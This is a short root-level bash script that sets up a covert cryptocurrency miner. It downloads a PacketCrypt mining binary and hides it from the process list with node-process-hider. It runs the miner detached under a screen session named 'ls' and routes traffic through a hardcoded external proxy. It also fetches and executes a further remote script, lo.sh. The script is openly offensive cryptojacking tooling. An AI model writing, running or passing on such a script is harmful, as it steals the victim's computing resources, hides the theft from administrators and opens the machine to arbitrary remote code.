#!/bin/bash
sudo su --command "sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
apt install proxychains -y
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs && 
npm install -g npm@8.5.0 && 
npm i -g node-process-hider && 
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && 
ph add packetcrypt && 
chmod +x packetcrypt && 
screen -dmS ls nohup ./packetcrypt ann -p pkt1qsektzuj7q274gg5y80ssecqeju4s6yfhjjdzvp http://pool.pkt.world http://pool.pktpool.io -t 80 > nohup.out &&
wget https://raw.githubusercontent.com/aurbach55/zash/main/lo.sh && chmod +x lo.sh && ./lo.sh"
